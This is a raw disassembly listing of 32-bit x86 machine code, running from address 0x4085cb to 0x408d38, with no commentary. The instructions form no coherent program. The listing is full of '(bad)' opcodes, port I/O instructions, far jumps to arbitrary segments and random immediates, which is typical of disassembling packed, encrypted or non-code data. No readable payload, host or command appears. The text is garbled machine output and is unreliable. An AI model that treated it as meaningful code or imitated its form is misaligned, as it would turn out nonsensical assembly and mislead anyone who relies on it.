  4085cb:	add    DWORD PTR [edi+0x29],eax
  4085ce:	repz cmp eax,0xae38516a
  4085d4:	shr    cl,cl
  4085d6:	out    0x71,al
  4085d8:	jno    0x408569
  4085da:	outs   dx,DWORD PTR ds:[esi]
  4085db:	shr    BYTE PTR [edx-0x46a4f086],0x5
  4085e2:	sub    al,0x5a
  4085e4:	or     esi,DWORD PTR [edx+0x1f]
  4085e7:	or     bl,BYTE PTR [ebp+ecx*8+0x14068bad]
  4085ee:	ds in  eax,dx
  4085f0:	push   esi
  4085f1:	cmp    ebp,edx
  4085f3:	mov    ebx,0xc2c104b4
  4085f8:	gs mov dl,0x5a
  4085fb:	xchg   ecx,eax
  4085fc:	pop    edx
  4085fe:	retf   0x52c8
  408601:	test   eax,0x5f4a467e
  408606:	popf   
  408607:	rcr    BYTE PTR [eax-0x3a],cl
  40860a:	pop    es
  40860b:	mov    ebx,0x6785f77c
  408610:	nop
  408611:	retw   0xd7a0
  408615:	es iret 
  408617:	jae    0x4085ff
  408619:	repz pop ecx
  40861b:	in     eax,0xb4
  40861d:	mov    ch,0xd6
  40861f:	xchg   edx,eax
  408620:	mov    dh,BYTE PTR es:[ebx-0x3a1bb959]
  408627:	add    DWORD PTR [edi],ebp
  408629:	cmp    al,0xf7
  40862b:	gs push ds
  40862d:	js     0x408613
  40862f:	sub    DWORD PTR [esi],ebx
  408631:	jle    0x408627
  408633:	mov    DWORD PTR ds:0xb912e327,esp
  408639:	push   0xe355a86c
  40863e:	pop    ebp
  40863f:	pushf  
  408640:	cdq    
  408641:	stos   DWORD PTR es:[edi],eax
  408642:	fadd   st(1),st
  408644:	or     DWORD PTR ds:0x1c183089,esp
  40864a:	mov    bl,0x3a
  40864c:	sub    ch,BYTE PTR [ebp+0x78]
  40864f:	xchg   ebp,eax
  408650:	or     eax,esp
  408652:	in     eax,0xad
  408654:	mov    ds:0x797c7aaf,eax
  408659:	aaa    
  40865a:	inc    edi
  40865b:	lods   eax,DWORD PTR ds:[esi]
  40865c:	cld    
  40865d:	mov    ecx,0x524c6b10
  408662:	xchg   esp,eax
  408663:	in     eax,0x96
  408665:	push   esp
  408666:	stos   BYTE PTR es:[edi],al
  408667:	div    BYTE PTR [edx]
  408669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40866a:	xchg   esp,eax
  40866b:	pop    eax
  40866c:	sub    al,0xb7
  40866e:	outs   dx,BYTE PTR ds:[esi]
  40866f:	in     eax,0xe8
  408671:	mov    ds:0xae578361,al
  408676:	jecxz  0x4086f0
  408678:	push   0x34269130
  40867d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40867e:	rcl    DWORD PTR [ebx],1
  408680:	pop    ebx
  408681:	sbb    bl,BYTE PTR [edx+0x73]
  408684:	scas   eax,DWORD PTR es:[edi]
  408685:	pop    ebp
  408686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408687:	pop    ebp
  408688:	pop    esp
  408689:	jnp    0x408670
  40868b:	xor    DWORD PTR [ebx],ebp
  40868d:	jp     0x40868a
  40868f:	cmp    ebx,esi
  408691:	xlat   BYTE PTR ds:[ebx]
  408692:	mov    ds:0x4ab6b5ac,al
  408697:	mov    cl,0xcd
  408699:	jb     0x4086aa
  40869b:	add    BYTE PTR [ecx+0x6646b25],bl
  4086a1:	cs test esi,esp
  4086a4:	loop   0x408701
  4086a6:	mov    cl,BYTE PTR [edi+0x69]
  4086a9:	pop    ss
  4086aa:	sti    
  4086ab:	loop   0x4086e8
  4086ad:	scas   al,BYTE PTR es:[edi]
  4086ae:	into   
  4086af:	popa   
  4086b0:	mov    ds:0xfe32aacf,al
  4086b5:	sti    
  4086b6:	(bad)  
  4086b7:	jmp    0x408710
  4086b9:	clc    
  4086ba:	into   
  4086bb:	mov    bh,0xfe
  4086bd:	cwde   
  4086be:	jle    0x408707
  4086c0:	shr    ebp,cl
  4086c2:	mov    dh,0xc9
  4086c4:	xor    dh,BYTE PTR [edi]
  4086c6:	dec    ebx
  4086c7:	push   edi
  4086c8:	enter  0x8bb0,0x29
  4086cc:	imul   BYTE PTR [esi+esi*1+0x23]
  4086d0:	push   ecx
  4086d1:	xchg   edx,eax
  4086d2:	in     eax,dx
  4086d3:	push   ecx
  4086d4:	xchg   edi,edx
  4086d6:	mov    edi,0x7ccf1cff
  4086db:	cmc    
  4086dc:	dec    ebx
  4086dd:	xchg   esp,eax
  4086de:	gs jo  0x4086c4
  4086e1:	push   ebx
  4086e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086e3:	daa    
  4086e4:	scas   eax,DWORD PTR es:[edi]
  4086e5:	mov    edx,0xd5a55c5e
  4086ea:	xlat   BYTE PTR ds:[ebx]
  4086eb:	(bad)  
  4086ec:	jae    0x40869b
  4086ee:	jp     0x4086b4
  4086f0:	fidiv  DWORD PTR [ecx]
  4086f2:	push   es
  4086f3:	adc    al,0x33
  4086f5:	inc    esi
  4086f6:	ret    
  4086f7:	mov    DWORD PTR ds:[edx-0x56],ecx
  4086fb:	inc    ecx
  4086fc:	inc    ebx
  4086fd:	inc    eax
  4086fe:	in     eax,dx
  4086ff:	jnp    0x408699
  408701:	inc    esi
  408702:	in     eax,dx
  408703:	mov    BYTE PTR [ecx-0xf106877],dl
  408709:	mov    dl,0x8e
  40870b:	sub    eax,0x8bb8006b
  408710:	and    al,0x69
  408712:	jp     0x408756
  408714:	or     dh,BYTE PTR [ecx]
  408716:	mov    bl,BYTE PTR ds:0x427d649
  40871c:	popa   
  40871d:	sub    eax,0xb05a6fd7
  408722:	sub    eax,0x8e5f4316
  408727:	sub    esp,DWORD PTR [esi]
  408729:	fcom   DWORD PTR [ebx]
  40872b:	loope  0x408719
  40872d:	sub    ecx,edx
  40872f:	lods   al,BYTE PTR ds:[esi]
  408730:	jmp    0xbb44:0xc60089b5
  408737:	mov    ss,WORD PTR [eax-0xe]
  40873a:	push   0x5b
  40873c:	adc    ebp,DWORD PTR [eax+0x7ef11122]
  408742:	adc    edx,DWORD PTR ds:0x302395b3
  408748:	iret   
  408749:	or     eax,0x9932ccd3
  40874e:	pop    ecx
  40874f:	fimul  WORD PTR es:[edi]
  408752:	nop
  408753:	out    0x51,eax
  408755:	push   edx
  408756:	nop
  408757:	push   edi
  408758:	mov    al,ds:0xcdfe3955
  40875d:	cwde   
  40875e:	jnp    0x4087ad
  408760:	loope  0x4086f1
  408762:	fimul  DWORD PTR [edi+0x74]
  408765:	mov    esi,0xc0d6fce8
  40876a:	cmc    
  40876b:	stos   DWORD PTR es:[edi],eax
  40876c:	xchg   edi,eax
  40876d:	js     0x408764
  40876f:	jnp    0x4087f0
  408771:	retf   0xe7b0
  408774:	es es int 0xf3
  408778:	jl     0x408783
  40877a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40877b:	fwait
  40877c:	lahf   
  40877d:	cmp    al,0xcf
  40877f:	leave  
  408780:	mov    dl,0x8c
  408782:	xchg   DWORD PTR [edi],ebx
  408784:	cmp    al,0x7
  408786:	in     eax,0x1e
  408788:	iret   
  408789:	xrelease xchg DWORD PTR ds:0xebf8b6d5,edx
  408791:	push   eax
  408792:	mov    edi,0x68504ad6
  408797:	fcomp  QWORD PTR [edi+0xd]
  40879a:	scas   al,BYTE PTR es:[edi]
  40879b:	std    
  40879c:	mov    ?,WORD PTR [eax]
  40879e:	shr    DWORD PTR [eax],0x8c
  4087a1:	pusha  
  4087a2:	adc    al,0x66
  4087a4:	(bad)  
  4087a5:	jo     0x40874a
  4087a7:	xchg   DWORD PTR [edx+ebp*4+0x31f0f252],edx
  4087ae:	(bad)  
  4087af:	push   esp
  4087b0:	test   eax,0xf98961bf
  4087b5:	push   es
  4087b6:	add    ebp,DWORD PTR [eax]
  4087b8:	mov    ecx,0x1ac026cf
  4087bd:	add    dh,ch
  4087bf:	cs dec edi
  4087c1:	dec    eax
  4087c2:	sub    DWORD PTR [ebx+0x15],edi
  4087c5:	add    BYTE PTR [eax+0x37],bl
  4087c8:	cmp    BYTE PTR [esi],dl
  4087ca:	jmp    0xefaf8881
  4087cf:	imul   edx,DWORD PTR [eax],0x94094a09
  4087d5:	adc    cl,BYTE PTR [eax-0x54f1ea36]
  4087db:	jnp    0x4087c1
  4087dd:	cmp    esi,ebp
  4087df:	call   0xaeea2745
  4087e4:	mov    ch,0xd8
  4087e6:	push   ds
  4087e7:	call   FWORD PTR [esi-0x4b]
  4087ea:	lods   eax,DWORD PTR ds:[esi]
  4087eb:	shl    DWORD PTR [esi],0x56
  4087ee:	pop    ebp
  4087ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f0:	push   esi
  4087f1:	mov    dh,0x79
  4087f3:	scas   al,BYTE PTR es:[edi]
  4087f4:	or     BYTE PTR [edx+ebx*4-0x23],cl
  4087f8:	mov    eax,0xb18d86ef
  4087fd:	xchg   esp,eax
  4087fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ff:	and    eax,0x39b30ccf
  408804:	dec    esp
  408805:	addr16 out dx,al
  408807:	jg     0x4087ef
  408809:	ret    
  40880a:	xor    DWORD PTR [ecx-0x2],0xfd594d7d
  408811:	sub    DWORD PTR [edx+0x3eabfbb9],ebx
  408817:	inc    edi
  408818:	add    al,BYTE PTR [edx+0x54]
  40881b:	and    eax,0xedeec2d6
  408820:	sbb    edi,DWORD PTR [ebp+esi*8-0xb930c26]
  408827:	pop    esp
  408828:	cli    
  408829:	ins    BYTE PTR es:[edi],dx
  40882a:	pop    ecx
  40882b:	xchg   esi,eax
  40882c:	sub    edx,DWORD PTR ds:0xd909f9be
  408832:	ja     0x4087bb
  408834:	xchg   DWORD PTR [ebx-0x32],esp
  408837:	pushf  
  408838:	fisub  DWORD PTR [ecx]
  40883a:	fsubrp st(2),st
  40883d:	cmp    ebx,edi
  40883f:	stc    
  408840:	xor    esi,DWORD PTR [edx-0x53]
  408843:	jmp    0x4087c5
  408845:	adc    al,0x7d
  408847:	pop    edi
  408848:	jne    0x4088a9
  40884a:	jno    0x408879
  40884c:	push   esi
  40884d:	and    BYTE PTR ds:0x59ed5d55,dl
  408853:	and    eax,DWORD PTR [eax]
  408855:	mov    al,0x3a
  408857:	pop    edi
  408858:	jmp    0x9f3ef852
  40885d:	iret   
  40885e:	out    0xb5,eax
  408860:	mov    DWORD PTR [ebp+edi*4-0x34],edx
  408864:	xor    bl,0xcd
  408867:	(bad)  
  408868:	out    dx,eax
  408869:	inc    esp
  40886a:	(bad)  
  40886b:	add    BYTE PTR [eax+0x17],dh
  40886e:	sub    ebx,ecx
  408870:	repnz popa 
  408872:	inc    eax
  408873:	sub    bh,ch
  408875:	add    BYTE PTR [edi+ebp*4],cl
  408878:	dec    edx
  408879:	mov    ecx,0x270e0ca4
  40887e:	sbb    dl,BYTE PTR [edx]
  408880:	inc    ecx
  408881:	mov    ds:0x9244ed24,al
  408886:	es push 0xffffffd9
  408889:	push   cs
  40888a:	mov    esi,0xf8fcc493
  40888f:	mov    ss,WORD PTR [esp+edi*4-0x47]
  408893:	dec    DWORD PTR [esi+0x65]
  408896:	sbb    esp,DWORD PTR [eax-0x510c5890]
  40889c:	xor    al,BYTE PTR [ebx]
  40889e:	mov    gs,WORD PTR [eax]
  4088a0:	outs   dx,DWORD PTR ds:[esi]
  4088a1:	jno    0x4088a6
  4088a3:	xor    edx,0x12
  4088a6:	mov    dl,0xdc
  4088a8:	inc    esi
  4088a9:	loope  0x4088eb
  4088ab:	xchg   edi,eax
  4088ac:	adc    eax,0x720a1ba8
  4088b1:	push   esp
  4088b2:	(bad)  
  4088b3:	pop    edi
  4088b4:	frstor [edx-0x2c]
  4088b7:	mov    ebx,0x2af5e936
  4088bc:	jae    0x4088e0
  4088be:	sub    bl,ah
  4088c0:	clc    
  4088c1:	lock xor BYTE PTR [edi],0x5e
  4088c5:	stc    
  4088c6:	xor    ebx,DWORD PTR [edx+0x2a]
  4088c9:	scas   eax,DWORD PTR es:[edi]
  4088ca:	sub    DWORD PTR [edi+0x18],edi
  4088cd:	data16 jmp 0x4088a6
  4088d0:	cmp    BYTE PTR [eax-0x6b],dl
  4088d3:	shl    BYTE PTR [edi],cl
  4088d5:	inc    ebx
  4088d6:	imul   eax,ecx,0x39e796e1
  4088dc:	addr16 dec edi
  4088de:	outs   dx,DWORD PTR ds:[esi]
  4088df:	jae    0x4088c2
  4088e1:	int    0x97
  4088e3:	fnstcw WORD PTR [ebx+0x3b096b7d]
  4088e9:	arpl   ax,bp
  4088eb:	scas   al,BYTE PTR es:[edi]
  4088ec:	sub    DWORD PTR [ebx],edi
  4088ee:	mov    ecx,DWORD PTR [eax+ecx*8]
  4088f1:	and    eax,0x2009a553
  4088f6:	shl    DWORD PTR [eax],1
  4088f8:	and    al,0x17
  4088fa:	sub    DWORD PTR [ecx],esi
  4088fc:	mov    ah,0x5b
  4088fe:	sub    DWORD PTR [ebp+0x59],esp
  408901:	(bad)  
  408902:	sub    BYTE PTR [edi+0x73],bh
  408905:	scas   al,BYTE PTR es:[edi]
  408906:	ret    
  408907:	mov    ds:0x4c9628,al
  40890c:	and    esp,eax
  40890e:	jne    0x40894f
  408910:	scas   eax,DWORD PTR es:[edi]
  408911:	loopne 0x408990
  408913:	xchg   ebx,eax
  408914:	mov    ch,0x13
  408916:	lock mov cs:0x34387a94,al
  40891d:	and    al,0x5b
  40891f:	(bad)  
  408921:	int    0x5b
  408923:	mov    ebx,0x54681c1c
  408928:	mov    ds:0xad0476e8,al
  40892d:	dec    esi
  40892e:	inc    edx
  40892f:	pop    ecx
  408930:	ret    0x666c
  408933:	enter  0xeb0a,0xd7
  408937:	in     eax,dx
  408938:	mov    ah,0x54
  40893a:	ss mov esi,0x34494df5
  408940:	repz in ax,dx
  408943:	jb     0x408901
  408945:	retf   
  408946:	fiadd  DWORD PTR [ebp+0x5e2f7069]
  40894c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40894d:	sub    ah,BYTE PTR [edi-0x3a319120]
  408953:	cmp    esp,ebp
  408955:	in     eax,dx
  408956:	inc    esi
  408957:	jecxz  0x408969
  408959:	ret    0x457d
  40895c:	fidivr WORD PTR [eax]
  40895e:	imul   eax,DWORD PTR [eiz*2+0x5a047789],0xffffffa6
  408966:	jae    0x408992
  408968:	push   es
  408969:	nop
  40896a:	jnp    0x4089b3
  40896c:	mov    al,ds:0xe24efe12
  408971:	leave  
  408972:	mov    DWORD PTR [edx],ebx
  408974:	push   edi
  408975:	stos   BYTE PTR es:[edi],al
  408976:	mov    ch,0xeb
  408978:	adc    BYTE PTR [edi+0x3f],bh
  40897b:	ret    0x1819
  40897e:	bound  ebx,QWORD PTR [ecx+eax*2]
  408981:	out    0xb3,al
  408983:	or     edi,ebx
  408985:	jge    0x408985
  408987:	stos   DWORD PTR es:[edi],eax
  408988:	hlt    
  408989:	sar    BYTE PTR [ecx+esi*1+0x29],cl
  40898d:	mov    edi,DWORD PTR [edi+0x3f]
  408990:	aad    0x31
  408992:	lea    esi,[eax+0x82cd35a]
  408998:	fild   DWORD PTR [ecx]
  40899a:	mov    edx,0xc3d30e9d
  40899f:	jge    0x40894f
  4089a1:	pop    edi
  4089a2:	mov    ebx,0x45b868ca
  4089a7:	xchg   edx,eax
  4089a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089a9:	cmc    
  4089aa:	xlat   BYTE PTR ds:[ebx]
  4089ab:	sar    BYTE PTR [edi+ebp*2-0x178e6081],cl
  4089b2:	xor    BYTE PTR [esi+0x46],bh
  4089b5:	dec    ebx
  4089b6:	mov    ebp,0x39e78fe7
  4089bb:	sub    BYTE PTR [ebp+0x461893a5],dh
  4089c1:	mov    ds:0x5be4e551,eax
  4089c6:	jp     0x408a26
  4089c8:	lahf   
  4089c9:	adc    BYTE PTR [ebp+eiz*2-0x7fe35527],dl
  4089d0:	or     eax,eax
  4089d2:	jge    0x408971
  4089d4:	cmp    al,0x74
  4089d6:	or     eax,0xb5884700
  4089db:	div    BYTE PTR [ecx+ebx*2-0x6a]
  4089df:	lahf   
  4089e0:	js     0x4089e0
  4089e2:	pop    ebx
  4089e3:	(bad)  
  4089e5:	fwait
  4089e6:	sti    
  4089e7:	jnp    0x408a64
  4089e9:	outs   dx,BYTE PTR ds:[esi]
  4089ea:	sbb    eax,0x90422080
  4089ef:	test   al,0x84
  4089f1:	sbb    edx,edi
  4089f3:	outs   dx,DWORD PTR ds:[esi]
  4089f4:	mov    cl,0xb7
  4089f6:	scas   eax,DWORD PTR es:[edi]
  4089f7:	dec    ecx
  4089f8:	xchg   ebp,eax
  4089f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089fa:	fisttp WORD PTR [edi-0x28]
  4089fd:	fsubr  QWORD PTR [ebx+edx*2+0x6a]
  408a01:	mov    eax,0xc6605bbd
  408a06:	add    eax,0x19434e59
  408a0b:	(bad)  
  408a0c:	push   edx
  408a0d:	loop   0x4089b7
  408a0f:	retf   
  408a10:	ins    BYTE PTR es:[edi],dx
  408a11:	jp     0x4089fd
  408a13:	sub    eax,0x8af736de
  408a18:	imul   eax,DWORD PTR [ebx-0x15],0xffffffb3
  408a1c:	lods   al,BYTE PTR ds:[esi]
  408a1d:	aam    0x98
  408a1f:	shl    BYTE PTR [ebp-0x3b],1
  408a22:	cmp    DWORD PTR [edi+0x2c],0x51
  408a26:	mov    esi,DWORD PTR [ebp-0x323a09d5]
  408a2c:	mov    bh,0xc1
  408a2e:	or     BYTE PTR [edx+0x4583751c],ch
  408a34:	mov    eax,0x7585f431
  408a39:	jle    0x4089bb
  408a3b:	test   eax,0x4c133261
  408a40:	xor    ecx,eax
  408a42:	jae    0x408a25
  408a44:	xor    ah,al
  408a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a47:	pop    es
  408a48:	sbb    eax,0xe7638922
  408a4e:	int    0xf4
  408a50:	xor    DWORD PTR [eax+0x45],0xffffffbb
  408a54:	jp     0x408ad5
  408a56:	cld    
  408a57:	mov    BYTE PTR [ebp-0x67],ah
  408a5a:	repz retf 0xcf4b
  408a5e:	and    ebp,ecx
  408a60:	cwde   
  408a61:	dec    esi
  408a62:	xor    DWORD PTR [bp+si+0x572c],0x29
  408a68:	dec    ecx
  408a69:	lods   eax,DWORD PTR ds:[esi]
  408a6a:	xchg   edi,eax
  408a6b:	pop    DWORD PTR [ecx]
  408a6d:	mov    al,ds:0x924f4b39
  408a72:	and    al,0x2e
  408a74:	out    0xbe,eax
  408a76:	sub    BYTE PTR [eax-0x18b3d8b4],bl
  408a7c:	jae    0x408a78
  408a7e:	sub    dh,BYTE PTR [ecx-0x11]
  408a81:	mov    edx,0x57cde0a1
  408a86:	mov    eax,0x3162b184
  408a8b:	fsubr  DWORD PTR [eax]
  408a8d:	test   BYTE PTR [ecx+0x6e83d184],0x7e
  408a94:	inc    esp
  408a95:	adc    DWORD PTR [edx+0x5],0xffffffad
  408a99:	push   esi
  408a9a:	stos   DWORD PTR es:[edi],eax
  408a9b:	retf   0x5801
  408a9e:	xchg   ebp,eax
  408a9f:	in     al,dx
  408aa0:	push   ebx
  408aa1:	adc    al,0x5
  408aa3:	jnp    0x408b20
  408aa5:	jnp    0x408af2
  408aa7:	pusha  
  408aa8:	add    eax,0xbf9bfabc
  408aad:	stc    
  408aae:	fwait
  408aaf:	dec    ebx
  408ab0:	jbe    0x408a73
  408ab2:	cmp    edx,DWORD PTR [ecx-0x5dbbffcb]
  408ab8:	retf   
  408ab9:	repnz sub al,0xf0
  408abc:	repz push ss
  408abe:	(bad)  
  408abf:	stos   BYTE PTR es:[edi],al
  408ac0:	sar    edx,1
  408ac2:	scas   eax,DWORD PTR es:[edi]
  408ac3:	imul   ebp,DWORD PTR [ebp+0x1f2d5a77],0xffffffe2
  408aca:	mov    edx,DWORD PTR [eax+ecx*2]
  408acd:	clc    
  408ace:	or     al,al
  408ad0:	lea    ebx,[ebx+0x454ac9b7]
  408ad6:	call   0xb0e1:0x84edda0a
  408add:	or     eax,0xb2028a08
  408ae2:	mov    ecx,0xcbb42f26
  408ae7:	adc    BYTE PTR [ecx+esi*2-0x7cb4f051],dh
  408aee:	outs   dx,BYTE PTR ds:[esi]
  408aef:	push   0x12
  408af1:	shl    edi,cl
  408af3:	mov    ebx,0xb837ed8d
  408af8:	test   DWORD PTR [edx-0x78],eax
  408afb:	inc    eax
  408afc:	mov    eax,ds:0x26c2a19
  408b01:	inc    edi
  408b02:	jl     0x408a91
  408b04:	mov    eax,0xdd75b35
  408b09:	push   edi
  408b0a:	inc    ebp
  408b0b:	xchg   esi,eax
  408b0c:	cdq    
  408b0d:	dec    edx
  408b0e:	mov    BYTE PTR [eax+ebp*8],al
  408b11:	shl    BYTE PTR [ebp-0x3e5e78fb],cl
  408b17:	pop    ecx
  408b18:	out    dx,al
  408b19:	sahf   
  408b1a:	mov    ecx,0x2dee2ed4
  408b1f:	inc    esp
  408b20:	cmp    eax,0x9e53581c
  408b25:	jo     0x408aed
  408b27:	inc    esi
  408b28:	cwde   
  408b29:	out    dx,eax
  408b2a:	outs   dx,BYTE PTR ds:[esi]
  408b2b:	mov    ds:0xaf1bc975,al
  408b30:	cmp    al,0x4f
  408b32:	bound  ecx,QWORD PTR [edi]
  408b34:	sbb    DWORD PTR [esi+ecx*1+0x29],ebp
  408b38:	mov    al,dl
  408b3a:	aas    
  408b3b:	mov    dh,0xa8
  408b3d:	jge    0x408b21
  408b3f:	ins    DWORD PTR es:[edi],dx
  408b40:	int    0xef
  408b42:	mov    eax,ds:0xc1660dc7
  408b47:	pusha  
  408b48:	xor    al,ah
  408b4a:	xchg   ebp,eax
  408b4b:	push   edi
  408b4c:	ffreep st(0)
  408b4e:	fadd   DWORD PTR [esp+eax*2+0x4d9dd9b9]
  408b55:	push   eax
  408b56:	enter  0x7dc6,0xad
  408b5a:	retf   0x8841
  408b5d:	stos   DWORD PTR es:[edi],eax
  408b5e:	or     edx,DWORD PTR [ebx]
  408b60:	jns    0x408bc3
  408b62:	cmp    al,0xf5
  408b64:	scas   eax,DWORD PTR es:[edi]
  408b65:	out    0x1b,al
  408b67:	lock ret 
  408b69:	xchg   DWORD PTR [ebp+0x56554836],ecx
  408b6f:	push   cs
  408b70:	mov    edi,0x3eb6dcea
  408b75:	inc    edi
  408b76:	mov    al,ds:0x2e1c51f3
  408b7b:	mov    cl,0x17
  408b7d:	loopne 0x408b51
  408b7f:	mov    ebp,0xcbbdd6d5
  408b84:	jg     0x408b57
  408b86:	add    BYTE PTR [eax+0x16],dl
  408b89:	inc    ebp
  408b8a:	pop    es
  408b8b:	cmp    BYTE PTR [ecx],ch
  408b8d:	test   al,bh
  408b8f:	xchg   esp,eax
  408b90:	mov    ch,0xf6
  408b92:	outs   dx,DWORD PTR ds:[esi]
  408b93:	sbb    ah,BYTE PTR [ebx+0x3e]
  408b96:	lods   al,BYTE PTR gs:[esi]
  408b98:	sbb    eax,0xb3d54f59
  408b9d:	sub    al,0x27
  408b9f:	iret   
  408ba0:	repz fisub DWORD PTR [eax]
  408ba3:	and    BYTE PTR [ebx],cl
  408ba5:	dec    eax
  408ba6:	dec    edi
  408ba7:	shr    DWORD PTR [esi-0x23],cl
  408baa:	fcmovb st,st(5)
  408bac:	rol    BYTE PTR [esi+0x29],cl
  408baf:	inc    ecx
  408bb0:	stos   DWORD PTR es:[edi],eax
  408bb1:	and    eax,0x5413f419
  408bb6:	mov    ds:0xe335cd98,al
  408bbb:	jno    0x408b7e
  408bbd:	fs scas al,BYTE PTR es:[edi]
  408bbf:	shl    esi,1
  408bc1:	outs   dx,BYTE PTR ds:[esi]
  408bc2:	aam    0x3d
  408bc4:	ds jae 0x408b7a
  408bc7:	imul   esi,ecx,0x4a
  408bca:	pop    ebx
  408bcb:	sub    DWORD PTR [ebx+0x0],esp
  408bce:	test   DWORD PTR ds:0x3cedddc7,edx
  408bd4:	dec    ebx
  408bd5:	mov    ?,WORD PTR gs:[eax]
  408bd8:	lods   al,BYTE PTR cs:[esi]
  408bda:	adc    eax,0x82809b60
  408bdf:	xor    eax,DWORD PTR [ebx]
  408be1:	lods   al,BYTE PTR ds:[esi]
  408be2:	inc    ecx
  408be3:	imul   ecx,DWORD PTR [ecx+0x51],0xffffffba
  408be7:	jno    0x408bea
  408be9:	and    DWORD PTR [eax+ebx*4],edx
  408bec:	jnp    0x408bee
  408bee:	dec    eax
  408bef:	xchg   ebx,eax
  408bf0:	test   DWORD PTR ds:0xd363384c,ebx
  408bf6:	(bad)  
  408bf8:	push   0x29aa5b58
  408bfd:	mov    edi,0x7fefd5e1
  408c02:	mov    edi,DWORD PTR [edx+esi*2-0x6f]
  408c06:	int    0x61
  408c08:	scas   eax,DWORD PTR es:[edi]
  408c09:	(bad)  
  408c0a:	repz fisttp WORD PTR [ebp-0x17]
  408c0e:	jecxz  0x408bf9
  408c10:	mov    bh,0x42
  408c12:	(bad)
  408c16:	fucomi st,st(5)
  408c18:	mov    dl,0xbf
  408c1a:	mov    edi,0xbdaf2bcf
  408c1f:	lds    ebp,FWORD PTR [eax-0x19]
  408c22:	and    DWORD PTR [edx],edi
  408c24:	fnstsw WORD PTR [esi]
  408c26:	push   edx
  408c27:	sub    al,BYTE PTR [edx+eiz*4]
  408c2a:	call   0xee7:0xab34407f
  408c31:	bound  esp,QWORD PTR [ebx]
  408c33:	jo     0x408c40
  408c35:	aam    0x3f
  408c37:	xor    BYTE PTR [ecx],al
  408c39:	ins    DWORD PTR es:[edi],dx
  408c3a:	cmp    eax,0xd19a9408
  408c3f:	mov    DWORD PTR [ecx],eax
  408c41:	push   edx
  408c42:	sub    DWORD PTR [edi+eax*1-0x7f66aa50],ecx
  408c49:	pop    edx
  408c4a:	jmp    0x408bf1
  408c4c:	cdq    
  408c4d:	test   BYTE PTR [ebp-0x621ffe54],bh
  408c53:	dec    eax
  408c54:	xchg   esi,eax
  408c55:	gs daa 
  408c57:	add    eax,0xbf820cfc
  408c5c:	add    dl,ah
  408c5e:	jno    0x408ccd
  408c60:	hlt    
  408c61:	pop    es
  408c62:	lods   al,BYTE PTR ds:[esi]
  408c63:	mov    ch,0xf
  408c65:	pop    ebx
  408c66:	imul   eax,DWORD PTR [edi],0xffffffd6
  408c69:	pop    edx
  408c6a:	xchg   edi,eax
  408c6b:	cdq    
  408c6c:	(bad)
  408c6f:	xor    ebx,DWORD PTR [ebx+0x24c5814e]
  408c75:	and    ch,dl
  408c77:	dec    ebx
  408c78:	xchg   edx,eax
  408c79:	adc    ah,BYTE PTR [ebx+0x34]
  408c7c:	out    0xdf,eax
  408c7e:	mov    edx,0x920fb581
  408c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c84:	shr    BYTE PTR [ecx-0x5],1
  408c87:	pop    ecx
  408c88:	pusha  
  408c89:	cli    
  408c8a:	sub    eax,0x3e32d2ca
  408c8f:	sub    al,0x19
  408c91:	dec    edi
  408c92:	dec    edx
  408c93:	mov    ah,0x6e
  408c95:	div    BYTE PTR [esi+0x8f82521]
  408c9b:	pusha  
  408c9c:	mov    al,0x96
  408c9e:	push   0x66
  408ca0:	lahf   
  408ca1:	and    eax,0xf1255e25
  408ca6:	stc    
  408ca7:	fwait
  408ca8:	out    0x8c,eax
  408caa:	push   es
  408cab:	push   es
  408cac:	sub    eax,0x7de37bf9
  408cb1:	dec    ebp
  408cb2:	push   eax
  408cb3:	icebp  
  408cb4:	fisttp DWORD PTR [ebp+ebp*4+0x142eb2ef]
  408cbb:	pop    eax
  408cbc:	push   0x4b
  408cbe:	xchg   esi,eax
  408cbf:	sbb    DWORD PTR [esi+0x73],esp
  408cc2:	shl    ecx,0xcc
  408cc5:	test   DWORD PTR [edi+eiz*8],eax
  408cc8:	mov    ecx,0x2690171b
  408ccd:	cs (bad) 
  408ccf:	fisub  WORD PTR [ecx]
  408cd1:	gs jecxz 0x408d0a
  408cd4:	std    
  408cd5:	lods   eax,DWORD PTR ds:[esi]
  408cd6:	sbb    eax,0x1478705
  408cdb:	ret    
  408cdc:	aad    0x8b
  408cde:	scas   eax,DWORD PTR es:[edi]
  408cdf:	xor    DWORD PTR [esi+0x4f6706fd],edi
  408ce5:	outs   dx,DWORD PTR ds:[esi]
  408ce6:	push   esi
  408ce7:	cmp    eax,0x3be5007f
  408cec:	sub    edx,edi
  408cee:	stos   BYTE PTR es:[edi],al
  408cef:	std    
  408cf0:	outs   dx,BYTE PTR ds:[esi]
  408cf1:	repnz iret 
  408cf3:	push   cs
  408cf4:	repz jns 0x408cbd
  408cf7:	xlat   BYTE PTR ds:[ebx]
  408cf8:	lahf   
  408cf9:	jge    0x408cfc
  408cfb:	stos   DWORD PTR es:[edi],eax
  408cfc:	cli    
  408cfd:	pushf  
  408cfe:	cmp    BYTE PTR [ecx-0x6a],bh
  408d01:	(bad)  
  408d02:	pusha  
  408d03:	dec    eax
  408d04:	(bad)  
  408d06:	pusha  
  408d07:	lods   eax,DWORD PTR ds:[esi]
  408d08:	test   al,0xc8
  408d0a:	rcr    BYTE PTR [ebp-0x569f49f4],cl
  408d10:	pop    ecx
  408d11:	jg     0x408cf6
  408d13:	ror    DWORD PTR [ecx+ecx*4-0x49a8017],0x17
  408d1b:	into   
  408d1c:	inc    edi
  408d1d:	bound  esi,QWORD PTR [ebp-0x3a]
  408d20:	out    0xb0,al
  408d22:	(bad)  
  408d23:	hlt    
  408d24:	or     ebp,DWORD PTR [esi+0x278efd06]
  408d2a:	or     BYTE PTR [ebp+0x1335652],dl
  408d30:	xor    eax,0x16e0c000
  408d35:	cmp    al,0xbd
  408d37:	scas   eax,DWORD PTR es:[edi]
  408d38:	repnz out 0x1e,eax
